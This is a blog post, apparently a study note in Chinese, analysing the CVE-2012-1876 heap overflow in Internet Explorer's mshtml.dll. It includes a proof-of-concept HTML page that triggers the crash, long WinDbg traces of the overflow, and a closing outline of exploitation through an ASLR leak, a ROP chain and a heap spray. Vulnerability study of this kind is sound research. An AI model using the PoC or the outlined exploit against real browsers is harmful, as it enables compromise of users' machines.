---
layout: post
title:  "Cve-2012-1876"
date:   2019-5-20
categories: 《漏洞战争》cve-2010-2553（浏览器漏洞）
excerpt: 
---

* content
{:toc}





# **Cve-2012-1876**

## **漏洞介绍**

在2012年的Pwn2Own黑客大赛上，来自法国的安全团队Vupen利用两个0day漏洞攻下了Windows 7中的IE9，其中一个0day就是cve-2012-1876。该漏洞主要是因为mshtml.dll中的CImplAry::EnsureSizeWorker函数在创建堆的时候没有对span大小进行验证导致堆溢出。主要适用的范围为IE6-IE9。

## **测试环境**

操作系统：Win XP

IE版本： 8.0.6001.18702

## **分析过程**

《漏洞战争》书上的内容以及网上找的POC都是用的Win
7做的测试，但不知道为什么我用Win
7的时候，一模一样的步骤但还是失败了，IE直接在打开poc网站的时候就崩溃了，没有断在hpa产生的堆页上，尝试了很多次都不行，最后还是在Win
XP上可以实现。

POC代码：

	<html>

	<body>

	<table style="table-layout:fixed" >

	<col id="132" width="41" span="1" >&nbsp </col>

	</table>

	<script>

		function over_trigger() {

			var obj_col = document.getElementById("132");

			obj_col.width = "42765";

			obj_col.span = 1000;

		}

	setTimeout("over_trigger();",1);

	</script>

	</body>

	</html>

先把span赋值为1然后在over_trigger运行后把span赋值1000造成溢出。

在调试前先用gflag.exe对IE开启hpa选项，如果直接在windbg附加之后用命令开启会失败。

Debuggers>gflags.exe -i IExplorer +hpa

Current Registry Settings for IExplorer executable are: 02000000

hpa - Enable page heap

打开windbg附加IE。

先看一下，确实已经开启了hpa

	0:000> !gflag

	Current NtGlobalFlag contents: 0x02000000

	hpa - Place heap allocations at ends of pages

这里还需要注意，要开启子进程调试，因为windbg默认情况下是不支持子进程调试的，但在这里IE运行的时候又会衍生出子进程。

	0:000> .childdbg 1

	Processes created by the current process will be debugged

运行之后拖入poc.html，程序断在了这里。

	0:000> g

	(988.d9c): Break instruction exception - code 80000003 (first chance)

	eax=7ffd4000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005

	eip=7c92120e esp=23d6ffcc ebp=23d6fff4 iopl=0 nv up ei pl zr na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=0038 gs=0000 efl=00000246

	ntdll!DbgBreakPoint:

	7c92120e cc int 3

	0:031> g

	(988.95c): Access violation - code c0000005 (first chance)

	First chance exceptions are reported before any exception handling.

	This exception may be expected and handled.

	eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=00349000 edi=00349018

	eip=3dea32cc esp=0643bed8 ebp=0643bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00050206

	mshtml!CTableColCalc::AdjustForCol+0x15:

	3dea32cc 890f mov dword ptr [edi],ecx
	ds:0023:00349018=????????
	
查看栈回溯，在当前函数mshtml!CTableColCalc::AdjustForCol中并没发现什么问题，那么应该就在它的上一层函数mshtml!CTableLayout::CalculateMinMax中。

	0:014> kb

	ChildEBP RetAddr Args to Child

	0643bee4 3dd0fad6 00414114 0643c230 00000001
	mshtml!CTableColCalc::AdjustForCol+0x15

	0643bf9c 3db464c0 00000001 0643c230 000003e8
	mshtml!CTableLayout::CalculateMinMax+0x556

	0643c1b8 3db4711e 0643c230 0643c1fc 00000001
	mshtml!CTableLayout::CalculateLayout+0x276

	0643c364 3db3c057 0643d9e0 0643c598 00000000
	mshtml!CTableLayout::CalcSizeVirtual+0x71f

	0643c49c 3db398f8 00353d80 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8

	0643c564 3db3965b 00000000 00353d80 00014c6c
	mshtml!CFlowLayout::MeasureSite+0x304

	0643c5b0 3db39a45 00353bc0 00000061 0643d9e0
	mshtml!CFlowLayout::GetSiteWidth+0x153

	0643c5f0 3db3a03f 00354108 00353d80 00000001
	mshtml!CLSMeasurer::GetSiteWidth+0xce

	0643c674 074f4cba 0c446ff8 0643c694 0643c758 mshtml!CEmbeddedILSObj::Fmt+0x14f

	0643c704 074f4df5 09f54efc 00000000 09f58d20 msls31!ProcessOneRun+0x3e6

	0643c760 074f4f2d 09f54f18 000156d6 00000000 msls31!FetchAppendEscCore+0x18e

	0643c7b4 074f4e89 00000000 00000000 00000014 msls31!LsDestroyLine+0x47c

	0643c83c 074f2725 00000007 000031de 00000000 msls31!LsDestroyLine+0x9fc

我们在mshtml!CTableLayout::CalculateMinMax函数下一个断点，下断点时候要保证mshtml模块已经加载完毕。

Sxe命令强制加载模块。

	0:000> lmm mshtml

	start end module name

	3da80000 3e037000 mshtml (deferred)

	0:000> sxe ld:mshtml

	0:000> g

	(914.88c): Break instruction exception - code 80000003 (first chance)

	eax=7ffd4000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005

	eip=7c92120e esp=2342ffcc ebp=2342fff4 iopl=0 nv up ei pl zr na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=0038 gs=0000 efl=00000246

	ntdll!DbgBreakPoint:

	7c92120e cc int 3

	0:031> bp mshtml!CTableLayout::CalculateMinMax

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g34lmkmmosj213s0n0dja.jpg>)

	3db46b8e 8bff mov edi,edi

	3db46b90 55 push ebp

	3db46b91 8bec mov ebp,esp

	3db46b93 81ec98000000 sub esp,98h

	3db46b99 53 push ebx

	3db46b9a 8b5d08 mov ebx,dword ptr [ebp+8] ;引用CTableLayout对象

	3db46b9d 56 push esi

	3db46b9e 8b750c mov esi,dword ptr [ebp+0Ch]

	3db46ba1 8b4628 mov eax,dword ptr [esi+28h]

	3db46ba4 898570ffffff mov dword ptr [ebp-90h],eax

	3db46baa 8b4354 mov eax,dword ptr [ebx+54h] ;span属性值的和，记为spannum

	3db46bad 894508 mov dword ptr [ebp+8],eax

可以看到第一个值就是spannum的值为1。

	0:014> dd ebx+54

	1955cefc 00000001 ffffffff ffffffff ffffffff

	1955cf0c ffffffff 3db4f7ec 00000004 00000004

	1955cf1c 19830ff0 3db4f7ec 00000004 00000004

	1955cf2c 1956fff0 00000000 00000000 3db4f7ec

	1955cf3c 00000000 00000000 00000000 00000000

	1955cf4c 00000000 00000000 00000000 00000000

	1955cf5c 00000000 00000000 00000000 00000000

	1955cf6c 00000000 00000000 00000000 00000000

继续往下走

	3db46c5b 8b5508 mov edx,dword ptr [ebp+8] ;edx=spannum

	3db46c5e 8bc2 mov eax,edx

	3db46c60 2bc1 sub eax,ecx

	3db46c62 8945e4 mov dword ptr [ebp-1Ch],eax

	3db46c65 6a00 push 0

	3db46c67 58 pop eax

	3db46c68 0f94c0 sete al

	3db46c6b 894b50 mov dword ptr [ebx+50h],ecx

	3db46c6e c1e008 shl eax,8

	3db46c71 334344 xor eax,dword ptr [ebx+44h]

	3db46c74 2500010000 and eax,100h

	3db46c79 314344 xor dword ptr [ebx+44h],eax
	ds:0023:1955ceec={IEXPLORE!__dyn_tls_init_callback <PERF> (IEXPLORE+0x12802)
	(00412802)}

	3db46c7c f6462c01 test byte ptr [esi+2Ch],1

	3db46c80 0f858858f5ff jne mshtml!CTableLayout::CalculateMinMax+0x189 (3da9c50e)

	3db46c86 33c0 xor eax,eax

	3db46c88 0945c8 or dword ptr [ebp-38h],eax

	3db46c8b 397d10 cmp dword ptr [ebp+10h],edi

	3db46c8e 0f85308b1c00 jne mshtml!CTableLayout::CalculateMinMax+0x19c (3dd0f7c4)

	3db46c94 8b8394000000 mov eax,dword ptr [ebx+94h]  ;eax用于和spannum作比较，记为spancmp

	3db46c9a c1e802 shr eax,2

	3db46c9d 3bc2 cmp eax,edx   ;如果spannum>spancmp则跳转，这里与书上作者的不一样，书上的是jge跳转的也是另一个位置且不满足跳转，这里跳转的是满足的。但两者之后运行的位置还是一样的。

	3db46c9f 0f8cf266f8ff jl mshtml!CTableLayout::CalculateMinMax+0x1e6 (3dacd397)

来到了这个位置

	3dacd397 3bd7 cmp edx,edi

	3dacd399 8db390000000 lea esi,[ebx+90h]

	3dacd39f 0f8c41d40c00 jl mshtml!CTableLayout::CalculateMinMax+0x202 (3db9a7e6)

	3dacd3a5 3b5608 cmp edx,dword ptr [esi+8]

	3dacd3a8 7613 jbe mshtml!CTableLayout::CalculateMinMax+0x20f (3dacd3bd)

	3dacd3aa 6a1c push 1Ch

	3dacd3ac 8bc2 mov eax,edx

	3dacd3ae 8bfe mov edi,esi

	3dacd3b0 e85b7f0800 call mshtml!CImplAry::EnsureSizeWorker (3db55310)

跟进mshtml!CImplAry::EnsureSizeWorker函数可以发现这个函数主要用于分配堆空间。分配的内存大小为spansum * 0x1C,虽然此处spansum为1，但其分配的最小值为0x1C * 4=0x70

	mshtml!CImplAry::EnsureSizeWorker:

	3db55310 8bff mov edi,edi

	3db55312 55 push ebp

	3db55313 8bec mov ebp,esp

	3db55315 51 push ecx

	3db55316 51 push ecx

	3db55317 53 push ebx

	3db55318 56 push esi

	3db55319 8bf0 mov esi,eax

	3db5531b 6a04 push 4

	3db5531d 58 pop eax

	3db5531e 3bf0 cmp esi,eax

	3db55320 8945fc mov dword ptr [ebp-4],eax

	3db55323 0f8398ccfcff jae mshtml!CImplAry::EnsureSizeWorker+0x15 (3db21fc1)

	3db55329 8d45f8 lea eax,[ebp-8]

	3db5532c 50 push eax

	3db5532d 8b45fc mov eax,dword ptr [ebp-4] ;eax=4

	3db55330 f76508 mul eax,dword ptr [ebp+8] ;eax=4*0x1C为分配的空间大小

	3db55333 52 push edx

	3db55334 50 push eax ;压入空间大小参数

	3db55335 e868ffffff call mshtml!ULongLongToUInt (3db552a2) ;转换类型

	3db5533a 8bd8 mov ebx,eax

	3db5533c 85db test ebx,ebx

	3db5533e 7525 jne mshtml!CImplAry::EnsureSizeWorker+0xb6 (3db55365)

	3db55340 f6470402 test byte ptr [edi+4],2

	3db55344 0f85a0f9faff jne mshtml!CImplAry::EnsureSizeWorker+0x5b (3db04cea)

	3db5534a ff75f8 push dword ptr [ebp-8]

	3db5534d 8d770c lea esi,[edi+0Ch]

	3db55350 e87affffff call mshtml!_HeapRealloc (3db552cf)

	3db55355 8bd8 mov ebx,eax

	3db55357 85db test ebx,ebx

	3db55359 750a jne mshtml!CImplAry::EnsureSizeWorker+0xb6 (3db55365)

	3db5535b 8b45fc mov eax,dword ptr [ebp-4]

	3db5535e 836704fd and dword ptr [edi+4],0FFFFFFFDh

	3db55362 894708 mov dword ptr [edi+8],eax

	3db55365 5e pop esi

	3db55366 8bc3 mov eax,ebx

	3db55368 5b pop ebx

	3db55369 c9 leave

	3db5536a c20400 ret 4

函数返回地址在CtableLayout+0x9c的位置，也就是ebx+0x9c，创建的大小为0x70

	0:013> dd ebx+9c

	002a5f0c 0034c328 00000000 00000000 00000000

	002a5f1c 00000000 00000000 00000000 00000000

	002a5f2c 00000000 000000c8 000000c8 00000000

	002a5f3c 00000000 00000000 00000000 00000000

	002a5f4c 00000000 00000000 00000000 00000000

	002a5f5c 00000000 00000000 00000000 00000000

	002a5f6c 00000000 00000000 00000000 ffffffff

	002a5f7c 00000001 00000000 00000000 00000000

	0:013> dd 0034c328

	0034c328 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	0034c338 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	0034c348 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	0034c358 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	0034c368 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	0034c378 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	0034c388 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	0034c398 a0a0a0a0 a0a0a0a0 00000000 00000000

	0:013> !heap -p -a 0034c328

	address 0034c328 found in

	_HEAP @ 260000

	HEAP_ENTRY Size Prev Flags UserPtr UserSize - state

	0034c300 0015 0000 [03] 0034c328 00070 - (busy)

g运行，因为poc中的over_trigger函数，所以程序还是会运行到第一个断点，也就是CalculateMinMax。第二次断在CalculateMinMax后，spannum不变，spancmp为4，所以不再分配内存。

我们在 mshtml!CTableCol::GetAAspan处下个断点，看看获取的span的值

	3dd0f923 8bc7 mov eax,edi

	3dd0f925 e8f391e8ff call mshtml!CTableCol::GetAAspan (3db98b1d)

	3dd0f92a 3de8030000 cmp eax,3E8h

	3dd0f92f 894510 mov dword ptr [ebp+10h],eax

	3dd0f932 7c07 jl mshtml!CTableLayout::CalculateMinMax+0x3bb (3dd0f93b)

	3dd0f934 c74510e8030000 mov dword ptr [ebp+10h],3E8h

第二次经过mshtml!CTableCol::GetAAspan后发现eax也就是span的值已经为0x3e8，也就是我们在poc中设置的值。

	0:013> g

	Breakpoint 1 hit

	eax=002e6710 ebx=23f54528 ecx=0000002b edx=00000000 esi=23f51bf4 edi=002e6710

	eip=3dd0f925 esp=0646bef8 ebp=0646bf9c iopl=0 nv up ei pl zr na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040246

	mshtml!CTableLayout::CalculateMinMax+0x3a5:

	3dd0f925 e8f391e8ff call mshtml!CTableCol::GetAAspan (3db98b1d)

	0:013> p

	eax=000003e8 ebx=23f54528 ecx=00000002 edx=002e67f8 esi=23f51bf4 edi=002e6710

	eip=3dd0f92a esp=0646bef8 ebp=0646bf9c iopl=0 nv up ei pl nz na po nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040202

	mshtml!CTableLayout::CalculateMinMax+0x3aa:

	3dd0f92a 3de8030000 cmp eax,3E8h

程序在这个mshtml!CWidthUnitValue::GetPixelWidth函数里面获取下面复制的内容。

	0:013> p

	eax=002e62e8 ebx=23f54528 ecx=0031b798 edx=002e67f8 esi=0646c230 edi=00000001

	eip=3dd0f9f8 esp=0646bef8 ebp=0646bf9c iopl=0 nv up ei pl nz na po nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040202

	mshtml!CTableLayout::CalculateMinMax+0x478:

	3dd0f9f8 6a00 push 0

	0:013> p

	eax=002e62e8 ebx=23f54528 ecx=0031b798 edx=002e67f8 esi=0646c230 edi=00000001

	eip=3dd0f9fa esp=0646bef4 ebp=0646bf9c iopl=0 nv up ei pl nz na po nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040202

	mshtml!CTableLayout::CalculateMinMax+0x47a:

	3dd0f9fa 56 push esi

	0:013> p

	eax=002e62e8 ebx=23f54528 ecx=0031b798 edx=002e67f8 esi=0646c230 edi=00000001

	eip=3dd0f9fb esp=0646bef0 ebp=0646bf9c iopl=0 nv up ei pl nz na po nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040202

	mshtml!CTableLayout::CalculateMinMax+0x47b:

	3dd0f9fb e85ea5dcff call mshtml!CWidthUnitValue::GetPixelWidth (3dad9f5e)

可以在IDA里面看一下这个函数的算法，a2是CFancyFormat类成员数据，整个函数大概的意思就是把CFancyFormat类成员数据向右移4位。

	v7 = *a2;

	v8 = *a3;

	v9 = *a2 & 0xF;

	switch ( v9 )

	{

		case 0:

			return 0;

		case 10:

			result = sub_3DB48AA1(a2, a5);

			if ( !(_BYTE)a7 )

			{

				if ( a4 )

					result = sub_3DDE7D70();

				else

					result = sub_3DDE7D94();

				return result;

				}

				break;

		case 11:

			result = sub_3DB3755C(a5 * (signed __int64)(v7 >> 4), 0x64u, 0);

			break;

		case 12:

			if ( a4 )

				v12 = v8[1];

			else

				v12 = *v8;

				result = sub_3DB3059F(v7 >> 4, a6 * v12, 14400000);

				break;

		default:

			if ( v9 <= 12 )

				return sub_3DB37652(v7 >> 4, v9, a4, a6, v8, a7);

			if ( v9 <= 14 )

				return v7 >> 4;

			if ( v9 != 15 )

				return sub_3DB37652(v7 >> 4, v9, a4, a6, v8, a7);

			return 0;

	}

	if ( result < 0 )

	{

		v11 = -1073741823;

		if ( result > -1073741823 )

			return result;

	}

	else

	{

		v11 = 0x3FFFFFFF;

		if ( result < 0x3FFFFFFF )

			return result;

	}
	return v11;

继续往下走，来到mshtml!CTableColCalc::AdjustForCol函数，这个函数的作用就是把数据前面mshtml!CWidthUnitValue::GetPixelWidth获得的数据复制到前面创建的堆中。

	3dd0fac2 ff75c0 push dword ptr [ebp-40h]

	3dd0fac5 8b45cc mov eax,dword ptr [ebp-34h]

	3dd0fac8 ff750c push dword ptr [ebp+0Ch]

	3dd0facb 8b75d8 mov esi,dword ptr [ebp-28h]

	3dd0face ff75f4 push dword ptr [ebp-0Ch]

	3dd0fad1 e8e1371900 call mshtml!CTableColCalc::AdjustForCol (3dea32b7)

edi为堆的地址，ecx为复制的数据，在mov dword ptr [edi],ecx这条语句进行复制。

	0:013> p

	eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=23f51bd8 edi=00000001

	eip=3dea32c8 esp=0646bedc ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x11:

	3dea32c8 8d7e18 lea edi,[esi+18h]

	0:013> p

	eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=23f51bd8 edi=23f51bf0

	eip=3dea32cb esp=0646bedc ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x14:

	3dea32cb 50 push eax

	0:013> dd 23f51bf0

	23f51bf0 00000000 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c00 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c10 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c20 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c30 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c40 e0e0e0e0 e0e0e0e0 a0a0a0a0 a0a0a0a0

	23f51c50 00000000 00000000 00150014 011403ed

	23f51c60 abcdaaaa 80161000 00000064 0000008c

	0:013> p

	eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=23f51bd8 edi=23f51bf0

	eip=3dea32cc esp=0646bed8 ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x15:

	3dea32cc 890f mov dword ptr [edi],ecx ds:0023:23f51bf0=00000000

	0:013> p

	eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=23f51bd8 edi=23f51bf0

	eip=3dea32ce esp=0646bed8 ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x17:

	3dea32ce e80d74c8ff call mshtml!CUnitValue::IsScalerUnit (3db2a6e0)

	0:013> dd 23f51bf0

	23f51bf0 04141149 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c00 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c10 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c20 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c30 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c40 e0e0e0e0 e0e0e0e0 a0a0a0a0 a0a0a0a0

	23f51c50 00000000 00000000 00150014 011403ed

	23f51c60 abcdaaaa 80161000 00000064 0000008c

后面的几行也是复制，esi是堆的地址。

	0:013> p

	eax=00414114 ebx=00414114 ecx=04141149 edx=00004141 esi=23f51bd8 edi=23f51bf0

	eip=3dea32dc esp=0646bed4 ebp=0646bee4 iopl=0 nv up ei pl nz na po nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040202

	mshtml!CTableColCalc::AdjustForCol+0x25:

	3dea32dc e8b029c8ff call mshtml!CUnitValue::SetValue (3db25c91)

	0:013> p

	eax=04141148 ebx=00414114 ecx=23f51bf0 edx=00004141 esi=23f51bd8 edi=23f51bf0

	eip=3dea32e1 esp=0646bedc ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x2a:

	3dea32e1 895e04 mov dword ptr [esi+4],ebx ds:0023:23f51bdc=00000000

	0:013> dd esi+4

	23f51bdc 00000000 00000000 00000000 e0e0e0e0

	23f51bec e0e0e0c0 04141148 e0e0e0e0 e0e0e0e0

	23f51bfc e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c0c e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c1c e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c2c e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c3c e0e0e0e0 e0e0e0e0 e0e0e0e0 a0a0a0a0

	23f51c4c a0a0a0a0 00000000 00000000 00150014

	0:013> p

	eax=04141148 ebx=00414114 ecx=23f51bf0 edx=00004141 esi=23f51bd8 edi=23f51bf0

	eip=3dea32e4 esp=0646bedc ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x2d:

	3dea32e4 891e mov dword ptr [esi],ebx ds:0023:23f51bd8=00000000

	0:013> dd esi+4

	23f51bdc 00414114 00000000 00000000 e0e0e0e0

	23f51bec e0e0e0c0 04141148 e0e0e0e0 e0e0e0e0

	23f51bfc e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c0c e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c1c e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c2c e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c3c e0e0e0e0 e0e0e0e0 e0e0e0e0 a0a0a0a0

	23f51c4c a0a0a0a0 00000000 00000000 00150014

	0:013> p

	eax=04141148 ebx=00414114 ecx=23f51bf0 edx=00004141 esi=23f51bd8 edi=23f51bf0

	eip=3dea32e6 esp=0646bedc ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x2f:

	3dea32e6 eb2a jmp mshtml!CTableColCalc::AdjustForCol+0x5b (3dea3312)

	0:013> dd esi+4

	23f51bdc 00414114 00000000 00000000 e0e0e0e0

	23f51bec e0e0e0c0 04141148 e0e0e0e0 e0e0e0e0

	23f51bfc e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c0c e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c1c e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c2c e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c3c e0e0e0e0 e0e0e0e0 e0e0e0e0 a0a0a0a0

	23f51c4c a0a0a0a0 00000000 00000000 00150014

	0:013> dd esi

	23f51bd8 00414114 00414114 00000000 00000000

	23f51be8 e0e0e0e0 e0e0e0c0 04141148 e0e0e0e0

	23f51bf8 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c08 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c18 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c28 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c38 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c48 a0a0a0a0 a0a0a0a0 00000000 00000000

	0:013> p

	eax=04141148 ebx=00414114 ecx=23f51bf0 edx=00004141 esi=23f51bd8 edi=23f51bf0

	eip=3dea3312 esp=0646bedc ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x5b:

	3dea3312 5f pop edi

	0:013> p

	eax=04141148 ebx=00414114 ecx=23f51bf0 edx=00004141 esi=23f51bd8 edi=00000001

	eip=3dea3313 esp=0646bee0 ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x5c:

	3dea3313 895e08 mov dword ptr [esi+8],ebx ds:0023:23f51be0=00000000

	0:013> p

	eax=04141148 ebx=00414114 ecx=23f51bf0 edx=00004141 esi=23f51bd8 edi=00000001

	eip=3dea3316 esp=0646bee0 ebp=0646bee4 iopl=0 nv up ei pl nz na pe nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040206

	mshtml!CTableColCalc::AdjustForCol+0x5f:

	3dea3316 5b pop ebx

	0:013> dd esi

	23f51bd8 00414114 00414114 00414114 00000000

	23f51be8 e0e0e0e0 e0e0e0c0 04141148 e0e0e0e0

	23f51bf8 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c08 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c18 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c28 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c38 e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0

	23f51c48 a0a0a0a0 a0a0a0a0 00000000 00000000

走出函数，循环跳转的过程是这样的

![](<http://ww1.sinaimg.cn/large/7fb67c86ly1g36svktgjoj20kp0b3t9i.jpg>)

循环结束的条件是这里的eax大于ptr[ebp+10h]，eax就是当前循环的次数，而[ebp+10h]就是前面获取的span，这里是1000。

	3dd0fae0 3b4510 cmp eax,dword ptr [ebp+10h] ss:0023:0646bfac=000003e8

	3dd0fae3 7caf jl mshtml!CTableLayout::CalculateMinMax+0x514 (3dd0fa94)

	0:013> p

	eax=00000002 ebx=23f54528 ecx=23f51c0c edx=00004141 esi=23f51bf4 edi=00000001

	eip=3dd0fae0 esp=0646bef8 ebp=0646bf9c iopl=0 nv up ei pl nz ac po nc

	cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00040212

	mshtml!CTableLayout::CalculateMinMax+0x560:

	3dd0fae0 3b4510 cmp eax,dword ptr [ebp+10h] ss:0023:0646bfac=000003e8

	0:013> dd ebp+10

	0646bfac 000003e8 00000000 23f54528 23f54528

	0646bfbc 3db3c057 3db4c101 3db41b8e 00000000

	0646bfcc ffffffff 00000000 00898ef8 1f3fd5cd

	0646bfdc 00000000 00000000 ffffffff 00000000

	0646bfec 7c931600 00000000 00000000 7c98c5a6

	0646bffc 00000038 00000000 00000000 0646c02c

	0646c00c 7c98c622 00000000 00000000 00000010

	0646c01c 00000038 002e62e8 00000000 3db75594

但我们之前创建的堆只有0x70大小，所以导致了溢出。

## **漏洞利用**

整体的思路大概是因为可以通过栈溢出来读取CButtonLayout的虚表指针，虚表指针和漏洞所在的mshtml.dll的偏移是一个固定值,这样就可以泄露出模块的地址来绕过ASLR，然后构造一个ROP调用VirtualProtect修改内存属性来绕过DEP。最后用堆喷把shellcode和rop喷射到绕过DEP的地址，从而执行任意代码。

因为我调试的是用XP的，提供的Exp都是win7上的，所以我还没完全实现调试，具体的调试步骤之后补充。

## **参考链接**

《漏洞战争》

<https://web.archive.org/web/20120713043025/www.vupen.com/blog/20120710.Advanced_Exploitation_of_Internet_Explorer_HeapOv_CVE-2012-1876.php>（**VUPEN 组织的poc**）

<https://paper.seebug.org/182/#0x00>

<https://bbs.pediy.com/thread-225252.htm>

<https://www.cnblogs.com/snip3r/p/9677546.html>
